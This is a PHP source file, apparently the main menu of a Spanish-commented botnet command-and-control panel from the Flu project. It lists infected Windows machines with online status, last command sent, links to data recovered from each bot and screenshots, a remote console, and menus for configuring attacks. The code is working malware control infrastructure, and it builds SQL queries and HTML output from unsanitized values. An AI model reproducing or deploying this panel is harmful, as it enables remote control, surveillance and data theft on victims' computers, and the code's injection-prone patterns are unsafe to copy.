<?php
//Comprobamos que existe una sesión y tiene la variable conectado, si no, redirige a la página principal
session_start();
if(empty($_SESSION['conectado']))
{
   header ("Location: index.php");
   exit;
}
error_reporting(0);
//Para mostrar una bola roja o verde dependiendo si la máquina infectada está conectada o no, se calcula el tiempo que ha pasado desde
//su última conexión
function estaConectada($fecha_actualizacion, $ahora){ 
	$fecha_1 = strtotime($fecha_actualizacion); 
	$fecha_2 = strtotime($ahora);
	$dife= $fecha_2 - $fecha_1;
	$minutosstr = ($dife/60); 
	$minutos = (INT)($minutosstr); 
	return $minutos<1; 
} 

//Muestra el logo del windows de la maquina infectada
function getImgSist($sistema){ 
	if($sistema=='5.1')
		return '/images/xp.png';
	if($sistema=='6.1')
		return '/images/7.png'; 
	else
		return '/images/vista.png'; 
} 

//Se realiza la conexión a la BBDD
//Datos de conexión a la BBBDD
include "conexion-bbdd.php";
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<style type="text/css">
<!--
@import url("css/style.css");
-->
body {
  background-image: url("images/fondo.png");
  background-color: #000000;
  background-repeat: repeat-x;
}
</style>
</head>
<body>
<br/><div align="center"></a><a href="http://www.flu-project.com"><img src="images/banner-servidor-web-flu.png" border="none"/></a></div><br/>
<div align="center" width="100%">
<a href="menuPrincipal.php"><img src="images/boton-menu-principal2.png" border="none"/></a>
<a href="configurar-ataque.php"><img src="images/boton-configurar-ataque.png" border="none"/></a>
<a href="configurar-claves.php"><img src="images/claves1.png" border="none"/></a>
<a href="gestionar-usuarios.php"><img src="images/user1.png" border="none"/></a>
<a href="logout.php"><img src="images/logout.png" border="none"/></a>
<?php

$_SESSION['id_unico_comando']=null;

$result_a = mysql_query("SELECT maquina,actualizacion, now(), sistema FROM t_maquinas");
//Se pinta la tabla con lás máquinas, su estado, fecha de última conexión y último comando enviado
if ($row_a = mysql_fetch_array($result_a)){
	echo '<table id="gradient-style" summary="Meeting Results" style="text-align:center;">';
	echo '<thead><tr><th scope="col"></th><th scope="col">Bot (Address_MAC)</th><th scope="col">Status</th><th scope="col">Last connection</th><th scope="col">Last command</th><th scope="col"></th><th scope="col">More</th><th scope="col"><a href="menuPrincipal.php"><img src="images/update.png" border="none"/></a></th></tr><thead><tbody>';
	do {
		echo '<tr><td><img src="'. getImgSist($row_a["sistema"]) .'"/></td>';
		echo '<td>' . $row_a["maquina"] . "</td>";
		if(estaConectada($row_a["actualizacion"], $row_a[2]))
		{
			
			echo '<td><img src="images/on.gif"/></td>';
		}
		else
		{	
			echo '<td><img src="images/off.gif"/></td>';
		}
		echo '<td>'.str_replace(array("-"),array("/"),$row_a["actualizacion"]).'</td>';
		$result_b=mysql_query("SELECT comando FROM t_".str_replace(array("."),array("_"),$row_a["maquina"])." order by fecha desc limit 1");
		$row_b = mysql_fetch_array($result_b);
		echo '<td>'.$row_b["comando"].'</td>';
		echo '<td><a href="verInformacion.php?maquina='.$row_a["maquina"].'"><img src="images/eye.png" style="border:none" alt="Ver información recuperada del bot" title="Ver información recuperada del bot" /></a></td>';
		$result_capturas_pantalla = mysql_query("SELECT * FROM t_imagenes_".str_replace(array("."),array("_"),$row_a["maquina"]));
		if ($row_capturas_pantalla = mysql_fetch_array($result_capturas_pantalla)){
			echo '<td><a href="menuImagenes.php?maquina='.$row_a["maquina"].'"><img src="images/screenshot.png" style="border:none" alt="Ver capturas de pantalla" title="Ver capturas de pantalla" /></a></td>';
		}
		else
		{
			echo '<td><img src="images/screenshot2.png" style="border:none" alt="No hay capturas de pantalla" title="No hay capturas de pantalla" /></td>';
		}
		if(estaConectada($row_a["actualizacion"], $row_a[2]))
		{
			
			echo '<td><a href="consola.php?maquina='. $row_a["maquina"] .'"><img src="images/cmd.png" style="border:none" alt="Abrir consola" title="Abrir consola" /></a></td></tr>';
		}
		else
		{	
			echo '<td><img src="images/cmd2.png" style="border:none" alt="Bot apagado" title="Bot apagado" /></td></tr>';
		}
		
	} while ($row_a = mysql_fetch_array($result_a));
	echo '</tbody></table>';
}
include "cerrar-conexion-bbdd.php";
?>
</div>
</body>
</html>